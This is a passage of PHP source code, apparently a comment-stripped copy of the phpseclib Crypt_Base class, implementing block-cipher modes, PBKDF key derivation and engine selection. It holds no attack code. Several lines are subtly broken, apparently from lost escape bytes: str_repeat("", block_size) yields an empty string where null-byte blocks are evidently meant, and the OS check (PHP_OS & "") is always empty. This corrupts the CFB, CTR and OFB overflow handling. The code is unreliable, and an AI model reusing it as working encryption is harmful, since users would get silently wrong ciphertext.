            $mod = pow(2, 32);
        }
        $result = 0;
        $arguments = func_get_args();
        foreach ($arguments as $argument) {
            $result+= $argument < 0 ? ($argument & 0x7FFFFFFF) + 0x80000000 : $argument;
        }
        if (is_int($result) || version_compare(PHP_VERSION, '5.3.0') >= 0 || (PHP_OS & "") === 'WIN') {
            return fmod($result, $mod);
        }
        return (fmod($result, 0x80000000) & 0x7FFFFFFF) | ((fmod(floor($result / 0x80000000), 2) & 1) << 31);
    }
    function _string_shift(&$string, $index = 1) {
        $substr = substr($string, 0, $index);
        $string = substr($string, $index);
        return $substr;
    }
}
define('CRYPT_MODE_CTR', -1);
define('CRYPT_MODE_ECB', 1);
define('CRYPT_MODE_CBC', 2);
define('CRYPT_MODE_CFB', 3);
define('CRYPT_MODE_OFB', 4);
define('CRYPT_MODE_STREAM', 5);
define('CRYPT_ENGINE_INTERNAL', 1);
define('CRYPT_ENGINE_MCRYPT', 2);
define('CRYPT_ENGINE_OPENSSL', 3);
class Crypt_Base {
    var $mode;
    var $block_size = 16;
    var $key = "";
    var $iv;
    var $encryptIV;
    var $decryptIV;
    var $continuousBuffer = false;
    var $enbuffer;
    var $debuffer;
    var $enmcrypt;
    var $demcrypt;
    var $enchanged = true;
    var $dechanged = true;
    var $ecb;
    var $cfb_init_len = 600;
    var $changed = true;
    var $padding = true;
    var $paddable = false;
    var $engine;
    var $preferredEngine;
    var $cipher_name_mcrypt;
    var $cipher_name_openssl;
    var $cipher_name_openssl_ecb;
    var $password_default_salt = 'phpseclib/salt';
    var $const_namespace;
    var $inline_crypt;
    var $use_inline_crypt;
    var $openssl_emulate_ctr = false;
    var $openssl_options;
    var $explicit_key_length = false;
    var $skip_key_adjustment = false;
    function __construct($mode = CRYPT_MODE_CBC) {
        switch ($mode) {
            case CRYPT_MODE_ECB:
                $this->paddable = true;
                $this->mode = CRYPT_MODE_ECB;
            break;
            case CRYPT_MODE_CTR:
            case CRYPT_MODE_CFB:
            case CRYPT_MODE_OFB:
            case CRYPT_MODE_STREAM:
                $this->mode = $mode;
            break;
            case CRYPT_MODE_CBC:
            default:
                $this->paddable = true;
                $this->mode = CRYPT_MODE_CBC;
        }
        $this->_setEngine();
        if ($this->use_inline_crypt !== false && function_exists('create_function')) {
            $this->use_inline_crypt = true;
        }
    }
    function Crypt_Base($mode = CRYPT_MODE_CBC) {
        $this->__construct($mode);
    }
    function setIV($iv) {
        if ($this->mode == CRYPT_MODE_ECB) {
            return;
        }
        $this->iv = $iv;
        $this->changed = true;
    }
    function setKeyLength($length) {
        $this->explicit_key_length = true;
        $this->changed = true;
        $this->_setEngine();
    }
    function getKeyLength() {
        return $this->key_length << 3;
    }
    function getBlockLength() {
        return $this->block_size << 3;
    }
    function setKey($key) {
        if (!$this->explicit_key_length) {
            $this->setKeyLength(strlen($key) << 3);
            $this->explicit_key_length = false;
        }
        $this->key = $key;
        $this->changed = true;
        $this->_setEngine();
    }
    function setPassword($password, $method = 'pbkdf2') {
        $key = '';
        switch ($method) {
            default:
                $func_args = func_get_args();
                $hash = isset($func_args[2]) ? $func_args[2] : 'sha1';
                $salt = isset($func_args[3]) ? $func_args[3] : $this->password_default_salt;
                $count = isset($func_args[4]) ? $func_args[4] : 1000;
                if (isset($func_args[5])) {
                    $dkLen = $func_args[5];
                } else {
                    $dkLen = $method == 'pbkdf1' ? 2 * $this->key_length : $this->key_length;
                }
                switch (true) {
                    case $method == 'pbkdf1':
                        if (!class_exists('Crypt_Hash')) {
                            include_once 'Crypt/Hash.php';
                        }
                        $hashObj = new Crypt_Hash();
                        $hashObj->setHash($hash);
                        if ($dkLen > $hashObj->getLength()) {
                            user_error('Derived key too long');
                            return false;
                        }
                        $t = $password . $salt;
                        for ($i = 0;$i < $count;++$i) {
                            $t = $hashObj->hash($t);
                        }
                        $key = substr($t, 0, $dkLen);
                        $this->setKey(substr($key, 0, $dkLen >> 1));
                        $this->setIV(substr($key, $dkLen >> 1));
                        return true;
                    case !function_exists('hash_pbkdf2'):
                    case !function_exists('hash_algos'):
                    case !in_array($hash, hash_algos()):
                        if (!class_exists('Crypt_Hash')) {
                            include_once 'Crypt/Hash.php';
                        }
                        $i = 1;
                        while (strlen($key) < $dkLen) {
                            $hmac = new Crypt_Hash();
                            $hmac->setHash($hash);
                            $hmac->setKey($password);
                            $f = $u = $hmac->hash($salt . pack('N', $i++));
                            for ($j = 2;$j <= $count;++$j) {
                                $u = $hmac->hash($u);
                                $f^= $u;
                            }
                            $key.= $f;
                        }
                        $key = substr($key, 0, $dkLen);
                    break;
                    default:
                        $key = hash_pbkdf2($hash, $password, $salt, $count, $dkLen, true);
                }
        }
        $this->setKey($key);
        return true;
    }
    function encrypt($plaintext) {
        if ($this->paddable) {
            $plaintext = $this->_pad($plaintext);
        }
        if ($this->engine === CRYPT_ENGINE_OPENSSL) {
            if ($this->changed) {
                $this->_clearBuffers();
                $this->changed = false;
            }
            switch ($this->mode) {
                case CRYPT_MODE_STREAM:
                    return openssl_encrypt($plaintext, $this->cipher_name_openssl, $this->key, $this->openssl_options);
                case CRYPT_MODE_ECB:
                    $result = openssl_encrypt($plaintext, $this->cipher_name_openssl, $this->key, $this->openssl_options);
                    return !defined('OPENSSL_RAW_DATA') ? substr($result, 0, -$this->block_size) : $result;
                case CRYPT_MODE_CBC:
                    $result = openssl_encrypt($plaintext, $this->cipher_name_openssl, $this->key, $this->openssl_options, $this->encryptIV);
                    if (!defined('OPENSSL_RAW_DATA')) {
                        $result = substr($result, 0, -$this->block_size);
                    }
                    if ($this->continuousBuffer) {
                        $this->encryptIV = substr($result, -$this->block_size);
                    }
                    return $result;
                case CRYPT_MODE_CTR:
                    return $this->_openssl_ctr_process($plaintext, $this->encryptIV, $this->enbuffer);
                case CRYPT_MODE_CFB:
                    $ciphertext = '';
                    if ($this->continuousBuffer) {
                        $iv = & $this->encryptIV;
                        $pos = & $this->enbuffer['pos'];
                    } else {
                        $iv = $this->encryptIV;
                        $pos = 0;
                    }
                    $len = strlen($plaintext);
                    $i = 0;
                    if ($pos) {
                        $orig_pos = $pos;
                        $max = $this->block_size - $pos;
                        if ($len >= $max) {
                            $i = $max;
                            $len-= $max;
                            $pos = 0;
                        } else {
                            $i = $len;
                            $pos+= $len;
                            $len = 0;
                        }
                        $ciphertext = substr($iv, $orig_pos) ^ $plaintext;
                        $iv = substr_replace($iv, $ciphertext, $orig_pos, $i);
                        $plaintext = substr($plaintext, $i);
                    }
                    $overflow = $len % $this->block_size;
                    if ($overflow) {
                        $ciphertext.= openssl_encrypt(substr($plaintext, 0, -$overflow) . str_repeat("", $this->block_size), $this->cipher_name_openssl, $this->key, $this->openssl_options, $iv);
                        $iv = $this->_string_pop($ciphertext, $this->block_size);
                        $size = $len - $overflow;
                        $block = $iv ^ substr($plaintext, -$overflow);
                        $iv = substr_replace($iv, $block, 0, $overflow);
                        $ciphertext.= $block;
                        $pos = $overflow;
                    } elseif ($len) {
                        $ciphertext = openssl_encrypt($plaintext, $this->cipher_name_openssl, $this->key, $this->openssl_options, $iv);
                        $iv = substr($ciphertext, -$this->block_size);
                    }
                    return $ciphertext;
                case CRYPT_MODE_OFB:
                    return $this->_openssl_ofb_process($plaintext, $this->encryptIV, $this->enbuffer);
            }
        }
        if ($this->engine === CRYPT_ENGINE_MCRYPT) {
            if ($this->changed) {
                $this->_setupMcrypt();
                $this->changed = false;
            }
            if ($this->enchanged) {
                @mcrypt_generic_init($this->enmcrypt, $this->key, $this->encryptIV);
                $this->enchanged = false;
            }
            if ($this->mode == CRYPT_MODE_CFB && $this->continuousBuffer) {
                $block_size = $this->block_size;
                $iv = & $this->encryptIV;
                $pos = & $this->enbuffer['pos'];
                $len = strlen($plaintext);
                $ciphertext = '';
                $i = 0;
                if ($pos) {
                    $orig_pos = $pos;
                    $max = $block_size - $pos;
                    if ($len >= $max) {
                        $i = $max;
                        $len-= $max;
                        $pos = 0;
                    } else {
                        $i = $len;
                        $pos+= $len;
                        $len = 0;
                    }
                    $ciphertext = substr($iv, $orig_pos) ^ $plaintext;
                    $iv = substr_replace($iv, $ciphertext, $orig_pos, $i);
                    $this->enbuffer['enmcrypt_init'] = true;
                }
                if ($len >= $block_size) {
                    if ($this->enbuffer['enmcrypt_init'] === false || $len > $this->cfb_init_len) {
                        if ($this->enbuffer['enmcrypt_init'] === true) {
                            @mcrypt_generic_init($this->enmcrypt, $this->key, $iv);
                            $this->enbuffer['enmcrypt_init'] = false;
                        }
                        $ciphertext.= @mcrypt_generic($this->enmcrypt, substr($plaintext, $i, $len - $len % $block_size));
                        $iv = substr($ciphertext, -$block_size);
                        $len%= $block_size;
                    } else {
                        while ($len >= $block_size) {
                            $iv = @mcrypt_generic($this->ecb, $iv) ^ substr($plaintext, $i, $block_size);
                            $ciphertext.= $iv;
                            $len-= $block_size;
                            $i+= $block_size;
                        }
                    }
                }
                if ($len) {
                    $iv = @mcrypt_generic($this->ecb, $iv);
                    $block = $iv ^ substr($plaintext, -$len);
                    $iv = substr_replace($iv, $block, 0, $len);
                    $ciphertext.= $block;
                    $pos = $len;
                }
                return $ciphertext;
            }
            $ciphertext = @mcrypt_generic($this->enmcrypt, $plaintext);
            if (!$this->continuousBuffer) {
                @mcrypt_generic_init($this->enmcrypt, $this->key, $this->encryptIV);
            }
            return $ciphertext;
        }
        if ($this->changed) {
            $this->_setup();
            $this->changed = false;
        }
        if ($this->use_inline_crypt) {
            $inline = $this->inline_crypt;
            return $inline('encrypt', $this, $plaintext);
        }
        $buffer = & $this->enbuffer;
        $block_size = $this->block_size;
        $ciphertext = '';
        switch ($this->mode) {
            case CRYPT_MODE_ECB:
                for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                    $ciphertext.= $this->_encryptBlock(substr($plaintext, $i, $block_size));
                }
            break;
            case CRYPT_MODE_CBC:
                $xor = $this->encryptIV;
                for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                    $block = substr($plaintext, $i, $block_size);
                    $block = $this->_encryptBlock($block ^ $xor);
                    $xor = $block;
                    $ciphertext.= $block;
                }
                if ($this->continuousBuffer) {
                    $this->encryptIV = $xor;
                }
            break;
            case CRYPT_MODE_CTR:
                $xor = $this->encryptIV;
                if (strlen($buffer['ciphertext'])) {
                    for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                        $block = substr($plaintext, $i, $block_size);
                        if (strlen($block) > strlen($buffer['ciphertext'])) {
                            $buffer['ciphertext'].= $this->_encryptBlock($xor);
                        }
                        $this->_increment_str($xor);
                        $key = $this->_string_shift($buffer['ciphertext'], $block_size);
                        $ciphertext.= $block ^ $key;
                    }
                } else {
                    for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                        $block = substr($plaintext, $i, $block_size);
                        $key = $this->_encryptBlock($xor);
                        $this->_increment_str($xor);
                        $ciphertext.= $block ^ $key;
                    }
                }
                if ($this->continuousBuffer) {
                    $this->encryptIV = $xor;
                    if ($start = strlen($plaintext) % $block_size) {
                        $buffer['ciphertext'] = substr($key, $start) . $buffer['ciphertext'];
                    }
                }
            break;
            case CRYPT_MODE_CFB:
                if ($this->continuousBuffer) {
                    $iv = & $this->encryptIV;
                    $pos = & $buffer['pos'];
                } else {
                    $iv = $this->encryptIV;
                    $pos = 0;
                }
                $len = strlen($plaintext);
                $i = 0;
                if ($pos) {
                    $orig_pos = $pos;
                    $max = $block_size - $pos;
                    if ($len >= $max) {
                        $i = $max;
                        $len-= $max;
                        $pos = 0;
                    } else {
                        $i = $len;
                        $pos+= $len;
                        $len = 0;
                    }
                    $ciphertext = substr($iv, $orig_pos) ^ $plaintext;
                    $iv = substr_replace($iv, $ciphertext, $orig_pos, $i);
                }
                while ($len >= $block_size) {
                    $iv = $this->_encryptBlock($iv) ^ substr($plaintext, $i, $block_size);
                    $ciphertext.= $iv;
                    $len-= $block_size;
                    $i+= $block_size;
                }
                if ($len) {
                    $iv = $this->_encryptBlock($iv);
                    $block = $iv ^ substr($plaintext, $i);
                    $iv = substr_replace($iv, $block, 0, $len);
                    $ciphertext.= $block;
                    $pos = $len;
                }
            break;
            case CRYPT_MODE_OFB:
                $xor = $this->encryptIV;
                if (strlen($buffer['xor'])) {
                    for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                        $block = substr($plaintext, $i, $block_size);
                        if (strlen($block) > strlen($buffer['xor'])) {
                            $xor = $this->_encryptBlock($xor);
                            $buffer['xor'].= $xor;
                        }
                        $key = $this->_string_shift($buffer['xor'], $block_size);
                        $ciphertext.= $block ^ $key;
                    }
                } else {
                    for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                        $xor = $this->_encryptBlock($xor);
                        $ciphertext.= substr($plaintext, $i, $block_size) ^ $xor;
                    }
                    $key = $xor;
                }
                if ($this->continuousBuffer) {
                    $this->encryptIV = $xor;
                    if ($start = strlen($plaintext) % $block_size) {
                        $buffer['xor'] = substr($key, $start) . $buffer['xor'];
                    }
                }
            break;
            case CRYPT_MODE_STREAM:
                $ciphertext = $this->_encryptBlock($plaintext);
            break;
        }
        return $ciphertext;
    }
    function decrypt($ciphertext) {
        if ($this->paddable) {
            $ciphertext = str_pad($ciphertext, strlen($ciphertext) + ($this->block_size - strlen($ciphertext) % $this->block_size) % $this->block_size, chr(0));
        }
        if ($this->engine === CRYPT_ENGINE_OPENSSL) {
            if ($this->changed) {
                $this->_clearBuffers();
                $this->changed = false;
            }
            switch ($this->mode) {
                case CRYPT_MODE_STREAM:
                    $plaintext = openssl_decrypt($ciphertext, $this->cipher_name_openssl, $this->key, $this->openssl_options);
                break;
                case CRYPT_MODE_ECB:
                    if (!defined('OPENSSL_RAW_DATA')) {
                        $ciphertext.= openssl_encrypt('', $this->cipher_name_openssl_ecb, $this->key, true);
                    }
                    $plaintext = openssl_decrypt($ciphertext, $this->cipher_name_openssl, $this->key, $this->openssl_options);
                break;
                case CRYPT_MODE_CBC:
                    if (!defined('OPENSSL_RAW_DATA')) {
                        $padding = str_repeat(chr($this->block_size), $this->block_size) ^ substr($ciphertext, -$this->block_size);
                        $ciphertext.= substr(openssl_encrypt($padding, $this->cipher_name_openssl_ecb, $this->key, true), 0, $this->block_size);
                        $offset = 2 * $this->block_size;
                    } else {
                        $offset = $this->block_size;
                    }
                    $plaintext = openssl_decrypt($ciphertext, $this->cipher_name_openssl, $this->key, $this->openssl_options, $this->decryptIV);
                    if ($this->continuousBuffer) {
                        $this->decryptIV = substr($ciphertext, -$offset, $this->block_size);
                    }
                break;
                case CRYPT_MODE_CTR:
                    $plaintext = $this->_openssl_ctr_process($ciphertext, $this->decryptIV, $this->debuffer);
                break;
                case CRYPT_MODE_CFB:
                    $plaintext = '';
                    if ($this->continuousBuffer) {
                        $iv = & $this->decryptIV;
                        $pos = & $this->buffer['pos'];
                    } else {
                        $iv = $this->decryptIV;
                        $pos = 0;
                    }
                    $len = strlen($ciphertext);
                    $i = 0;
                    if ($pos) {
                        $orig_pos = $pos;
                        $max = $this->block_size - $pos;
                        if ($len >= $max) {
                            $i = $max;
                            $len-= $max;
                            $pos = 0;
                        } else {
                            $i = $len;
                            $pos+= $len;
                            $len = 0;
                        }
                        $plaintext = substr($iv, $orig_pos) ^ $ciphertext;
                        $iv = substr_replace($iv, substr($ciphertext, 0, $i), $orig_pos, $i);
                        $ciphertext = substr($ciphertext, $i);
                    }
                    $overflow = $len % $this->block_size;
                    if ($overflow) {
                        $plaintext.= openssl_decrypt(substr($ciphertext, 0, -$overflow), $this->cipher_name_openssl, $this->key, $this->openssl_options, $iv);
                        if ($len - $overflow) {
                            $iv = substr($ciphertext, -$overflow - $this->block_size, -$overflow);
                        }
                        $iv = openssl_encrypt(str_repeat("", $this->block_size), $this->cipher_name_openssl, $this->key, $this->openssl_options, $iv);
                        $plaintext.= $iv ^ substr($ciphertext, -$overflow);
                        $iv = substr_replace($iv, substr($ciphertext, -$overflow), 0, $overflow);
                        $pos = $overflow;
                    } elseif ($len) {
                        $plaintext.= openssl_decrypt($ciphertext, $this->cipher_name_openssl, $this->key, $this->openssl_options, $iv);
                        $iv = substr($ciphertext, -$this->block_size);
                    }
                break;
                case CRYPT_MODE_OFB:
                    $plaintext = $this->_openssl_ofb_process($ciphertext, $this->decryptIV, $this->debuffer);
            }
            return $this->paddable ? $this->_unpad($plaintext) : $plaintext;
        }
        if ($this->engine === CRYPT_ENGINE_MCRYPT) {
            $block_size = $this->block_size;
            if ($this->changed) {
                $this->_setupMcrypt();
                $this->changed = false;
            }
            if ($this->dechanged) {
                @mcrypt_generic_init($this->demcrypt, $this->key, $this->decryptIV);
                $this->dechanged = false;
            }
            if ($this->mode == CRYPT_MODE_CFB && $this->continuousBuffer) {
                $iv = & $this->decryptIV;
                $pos = & $this->debuffer['pos'];
                $len = strlen($ciphertext);
                $plaintext = '';
                $i = 0;
                if ($pos) {
                    $orig_pos = $pos;
                    $max = $block_size - $pos;
                    if ($len >= $max) {
                        $i = $max;
                        $len-= $max;
                        $pos = 0;
                    } else {
                        $i = $len;
                        $pos+= $len;
                        $len = 0;
                    }
                    $plaintext = substr($iv, $orig_pos) ^ $ciphertext;
                    $iv = substr_replace($iv, substr($ciphertext, 0, $i), $orig_pos, $i);
                }
                if ($len >= $block_size) {
                    $cb = substr($ciphertext, $i, $len - $len % $block_size);
                    $plaintext.= @mcrypt_generic($this->ecb, $iv . $cb) ^ $cb;
                    $iv = substr($cb, -$block_size);
                    $len%= $block_size;
                }
                if ($len) {
                    $iv = @mcrypt_generic($this->ecb, $iv);
                    $plaintext.= $iv ^ substr($ciphertext, -$len);
                    $iv = substr_replace($iv, substr($ciphertext, -$len), 0, $len);
                    $pos = $len;
                }
                return $plaintext;
            }
            $plaintext = @mdecrypt_generic($this->demcrypt, $ciphertext);
            if (!$this->continuousBuffer) {
                @mcrypt_generic_init($this->demcrypt, $this->key, $this->decryptIV);
            }
            return $this->paddable ? $this->_unpad($plaintext) : $plaintext;
        }
        if ($this->changed) {
            $this->_setup();
            $this->changed = false;
        }
        if ($this->use_inline_crypt) {
            $inline = $this->inline_crypt;
            return $inline('decrypt', $this, $ciphertext);
        }
        $block_size = $this->block_size;
        $buffer = & $this->debuffer;
        $plaintext = '';
        switch ($this->mode) {
            case CRYPT_MODE_ECB:
                for ($i = 0;$i < strlen($ciphertext);$i+= $block_size) {
                    $plaintext.= $this->_decryptBlock(substr($ciphertext, $i, $block_size));
                }
            break;
            case CRYPT_MODE_CBC:
                $xor = $this->decryptIV;
                for ($i = 0;$i < strlen($ciphertext);$i+= $block_size) {
                    $block = substr($ciphertext, $i, $block_size);
                    $plaintext.= $this->_decryptBlock($block) ^ $xor;
                    $xor = $block;
                }
                if ($this->continuousBuffer) {
                    $this->decryptIV = $xor;
                }
            break;
            case CRYPT_MODE_CTR:
                $xor = $this->decryptIV;
                if (strlen($buffer['ciphertext'])) {
                    for ($i = 0;$i < strlen($ciphertext);$i+= $block_size) {
                        $block = substr($ciphertext, $i, $block_size);
                        if (strlen($block) > strlen($buffer['ciphertext'])) {
                            $buffer['ciphertext'].= $this->_encryptBlock($xor);
                            $this->_increment_str($xor);
                        }
                        $key = $this->_string_shift($buffer['ciphertext'], $block_size);
                        $plaintext.= $block ^ $key;
                    }
                } else {
                    for ($i = 0;$i < strlen($ciphertext);$i+= $block_size) {
                        $block = substr($ciphertext, $i, $block_size);
                        $key = $this->_encryptBlock($xor);
                        $this->_increment_str($xor);
                        $plaintext.= $block ^ $key;
                    }
                }
                if ($this->continuousBuffer) {
                    $this->decryptIV = $xor;
                    if ($start = strlen($ciphertext) % $block_size) {
                        $buffer['ciphertext'] = substr($key, $start) . $buffer['ciphertext'];
                    }
                }
            break;
            case CRYPT_MODE_CFB:
                if ($this->continuousBuffer) {
                    $iv = & $this->decryptIV;
                    $pos = & $buffer['pos'];
                } else {
                    $iv = $this->decryptIV;
                    $pos = 0;
                }
                $len = strlen($ciphertext);
                $i = 0;
                if ($pos) {
                    $orig_pos = $pos;
                    $max = $block_size - $pos;
                    if ($len >= $max) {
                        $i = $max;
                        $len-= $max;
                        $pos = 0;
                    } else {
                        $i = $len;
                        $pos+= $len;
                        $len = 0;
                    }
                    $plaintext = substr($iv, $orig_pos) ^ $ciphertext;
                    $iv = substr_replace($iv, substr($ciphertext, 0, $i), $orig_pos, $i);
                }
                while ($len >= $block_size) {
                    $iv = $this->_encryptBlock($iv);
                    $cb = substr($ciphertext, $i, $block_size);
                    $plaintext.= $iv ^ $cb;
                    $iv = $cb;
                    $len-= $block_size;
                    $i+= $block_size;
                }
                if ($len) {
                    $iv = $this->_encryptBlock($iv);
                    $plaintext.= $iv ^ substr($ciphertext, $i);
                    $iv = substr_replace($iv, substr($ciphertext, $i), 0, $len);
                    $pos = $len;
                }
            break;
            case CRYPT_MODE_OFB:
                $xor = $this->decryptIV;
                if (strlen($buffer['xor'])) {
                    for ($i = 0;$i < strlen($ciphertext);$i+= $block_size) {
                        $block = substr($ciphertext, $i, $block_size);
                        if (strlen($block) > strlen($buffer['xor'])) {
                            $xor = $this->_encryptBlock($xor);
                            $buffer['xor'].= $xor;
                        }
                        $key = $this->_string_shift($buffer['xor'], $block_size);
                        $plaintext.= $block ^ $key;
                    }
                } else {
                    for ($i = 0;$i < strlen($ciphertext);$i+= $block_size) {
                        $xor = $this->_encryptBlock($xor);
                        $plaintext.= substr($ciphertext, $i, $block_size) ^ $xor;
                    }
                    $key = $xor;
                }
                if ($this->continuousBuffer) {
                    $this->decryptIV = $xor;
                    if ($start = strlen($ciphertext) % $block_size) {
                        $buffer['xor'] = substr($key, $start) . $buffer['xor'];
                    }
                }
            break;
            case CRYPT_MODE_STREAM:
                $plaintext = $this->_decryptBlock($ciphertext);
            break;
        }
        return $this->paddable ? $this->_unpad($plaintext) : $plaintext;
    }
    function _openssl_ctr_process($plaintext, &$encryptIV, &$buffer) {
        $ciphertext = '';
        $block_size = $this->block_size;
        $key = $this->key;
        if ($this->openssl_emulate_ctr) {
            $xor = $encryptIV;
            if (strlen($buffer['ciphertext'])) {
                for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                    $block = substr($plaintext, $i, $block_size);
                    if (strlen($block) > strlen($buffer['ciphertext'])) {
                        $result = openssl_encrypt($xor, $this->cipher_name_openssl_ecb, $key, $this->openssl_options);
                        $result = !defined('OPENSSL_RAW_DATA') ? substr($result, 0, -$this->block_size) : $result;
                        $buffer['ciphertext'].= $result;
                    }
                    $this->_increment_str($xor);
                    $otp = $this->_string_shift($buffer['ciphertext'], $block_size);
                    $ciphertext.= $block ^ $otp;
                }
            } else {
                for ($i = 0;$i < strlen($plaintext);$i+= $block_size) {
                    $block = substr($plaintext, $i, $block_size);
                    $otp = openssl_encrypt($xor, $this->cipher_name_openssl_ecb, $key, $this->openssl_options);
                    $otp = !defined('OPENSSL_RAW_DATA') ? substr($otp, 0, -$this->block_size) : $otp;
                    $this->_increment_str($xor);
                    $ciphertext.= $block ^ $otp;
                }
            }
            if ($this->continuousBuffer) {
                $encryptIV = $xor;
                if ($start = strlen($plaintext) % $block_size) {
                    $buffer['ciphertext'] = substr($key, $start) . $buffer['ciphertext'];
                }
            }
            return $ciphertext;
        }
        if (strlen($buffer['ciphertext'])) {
            $ciphertext = $plaintext ^ $this->_string_shift($buffer['ciphertext'], strlen($plaintext));
            $plaintext = substr($plaintext, strlen($ciphertext));
            if (!strlen($plaintext)) {
                return $ciphertext;
            }
        }
        $overflow = strlen($plaintext) % $block_size;
        if ($overflow) {
            $plaintext2 = $this->_string_pop($plaintext, $overflow);
            $encrypted = openssl_encrypt($plaintext . str_repeat("", $block_size), $this->cipher_name_openssl, $key, $this->openssl_options, $encryptIV);
            $temp = $this->_string_pop($encrypted, $block_size);
            $ciphertext.= $encrypted . ($plaintext2 ^ $temp);
            if ($this->continuousBuffer) {
                $buffer['ciphertext'] = substr($temp, $overflow);
                $encryptIV = $temp;
            }
        } elseif (!strlen($buffer['ciphertext'])) {
            $ciphertext.= openssl_encrypt($plaintext . str_repeat("", $block_size), $this->cipher_name_openssl, $key, $this->openssl_options, $encryptIV);
            $temp = $this->_string_pop($ciphertext, $block_size);
            if ($this->continuousBuffer) {
                $encryptIV = $temp;
            }
        }
        if ($this->continuousBuffer) {
            if (!defined('OPENSSL_RAW_DATA')) {
                $encryptIV.= openssl_encrypt('', $this->cipher_name_openssl_ecb, $key, $this->openssl_options);
            }
            $encryptIV = openssl_decrypt($encryptIV, $this->cipher_name_openssl_ecb, $key, $this->openssl_options);
            if ($overflow) {
                $this->_increment_str($encryptIV);
            }
        }
        return $ciphertext;
    }
    function _openssl_ofb_process($plaintext, &$encryptIV, &$buffer) {
        if (strlen($buffer['xor'])) {
            $ciphertext = $plaintext ^ $buffer['xor'];
            $buffer['xor'] = substr($buffer['xor'], strlen($ciphertext));
            $plaintext = substr($plaintext, strlen($ciphertext));
        } else {
            $ciphertext = '';
        }
        $block_size = $this->block_size;
        $len = strlen($plaintext);
        $key = $this->key;
        $overflow = $len % $block_size;
        if (strlen($plaintext)) {
            if ($overflow) {
                $ciphertext.= openssl_encrypt(substr($plaintext, 0, -$overflow) . str_repeat("", $block_size), $this->cipher_name_openssl, $key, $this->openssl_options, $encryptIV);
                $xor = $this->_string_pop($ciphertext, $block_size);
                if ($this->continuousBuffer) {
                    $encryptIV = $xor;
                }
                $ciphertext.= $this->_string_shift($xor, $overflow) ^ substr($plaintext, -$overflow);
                if ($this->continuousBuffer) {
                    $buffer['xor'] = $xor;
                }
            } else {
                $ciphertext = openssl_encrypt($plaintext, $this->cipher_name_openssl, $key, $this->openssl_options, $encryptIV);
                if ($this->continuousBuffer) {
                    $encryptIV = substr($ciphertext, -$block_size) ^ substr($plaintext, -$block_size);
                }
            }
        }
        return $ciphertext;
    }
    function _openssl_translate_mode() {
        switch ($this->mode) {
            case CRYPT_MODE_ECB:
                return 'ecb';
            case CRYPT_MODE_CBC:
                return 'cbc';
            case CRYPT_MODE_CTR:
                return 'ctr';
            case CRYPT_MODE_CFB:
                return 'cfb';
            case CRYPT_MODE_OFB:
                return 'ofb';
        }
    }
    function enablePadding() {
        $this->padding = true;
    }
    function disablePadding() {
        $this->padding = false;
    }
    function enableContinuousBuffer() {
        if ($this->mode == CRYPT_MODE_ECB) {
            return;
        }
        $this->continuousBuffer = true;
        $this->_setEngine();
    }
    function disableContinuousBuffer() {
        if ($this->mode == CRYPT_MODE_ECB) {
            return;
        }
        if (!$this->continuousBuffer) {
            return;
        }
        $this->continuousBuffer = false;
        $this->changed = true;
        $this->_setEngine();
    }
    function isValidEngine($engine) {
        switch ($engine) {
            case CRYPT_ENGINE_OPENSSL:
                if ($this->mode == CRYPT_MODE_STREAM && $this->continuousBuffer) {
                    return false;
                }
                $this->openssl_emulate_ctr = false;
                $result = $this->cipher_name_openssl && extension_loaded('openssl') && version_compare(PHP_VERSION, '5.3.3', '>=');
                if (!$result) {
                    return false;
                }
                if (!defined('OPENSSL_RAW_DATA')) {
                    $this->openssl_options = true;
                } else {
                    $this->openssl_options = OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING;
                }
                $methods = openssl_get_cipher_methods();
                if (in_array($this->cipher_name_openssl, $methods)) {
                    return true;
                }
                switch ($this->mode) {
                    case CRYPT_MODE_CTR:
                        if (in_array($this->cipher_name_openssl_ecb, $methods)) {
                            $this->openssl_emulate_ctr = true;
                            return true;
                        }
                }
                return false;
            case CRYPT_ENGINE_MCRYPT:
                return $this->cipher_name_mcrypt && extension_loaded('mcrypt') && in_array($this->cipher_name_mcrypt, @mcrypt_list_algorithms());
            case CRYPT_ENGINE_INTERNAL:
                return true;
        }
        return false;
    }
    function setPreferredEngine($engine) {
        switch ($engine) {
            case CRYPT_ENGINE_MCRYPT:
            case CRYPT_ENGINE_INTERNAL:
                $this->preferredEngine = $engine;
            break;
            default:
                $this->preferredEngine = CRYPT_ENGINE_OPENSSL;
        }
        $this->_setEngine();
    }
    function getEngine() {
        return $this->engine;
    }
    function _setEngine() {
        $this->engine = null;
        $candidateEngines = array($this->preferredEngine, CRYPT_ENGINE_OPENSSL, CRYPT_ENGINE_MCRYPT);
        foreach ($candidateEngines as $engine) {
            if ($this->isValidEngine($engine)) {
                $this->engine = $engine;
                break;
            }
        }
        if (!$this->engine) {
            $this->engine = CRYPT_ENGINE_INTERNAL;
        }
        if ($this->engine != CRYPT_ENGINE_MCRYPT && $this->enmcrypt) {
            @mcrypt_module_close($this->enmcrypt);
            @mcrypt_module_close($this->demcrypt);
            $this->enmcrypt = null;
            $this->demcrypt = null;
            if ($this->ecb) {
                @mcrypt_module_close($this->ecb);
                $this->ecb = null;
            }
        }
        $this->changed = true;
    }
    function _encryptBlock($in) {
        user_error((version_compare(PHP_VERSION, '5.0.0', '>=') ? __METHOD__ : __FUNCTION__) . '() must extend by class ' . get_class($this), E_USER_ERROR);
    }
    function _decryptBlock($in) {
        user_error((version_compare(PHP_VERSION, '5.0.0', '>=') ? __METHOD__ : __FUNCTION__) . '() must extend by class ' . get_class($this), E_USER_ERROR);
    }
    function _setupKey() {
        user_error((version_compare(PHP_VERSION, '5.0.0', '>=') ? __METHOD__ : __FUNCTION__) . '() must extend by class ' . get_class($this), E_USER_ERROR);
    }
    function _setup() {
        $this->_clearBuffers();
        $this->_setupKey();
        if ($this->use_inline_crypt) {
            $this->_setupInlineCrypt();
        }
    }
    function _setupMcrypt() {
        $this->_clearBuffers();
        $this->enchanged = $this->dechanged = true;
        if (!isset($this->enmcrypt)) {
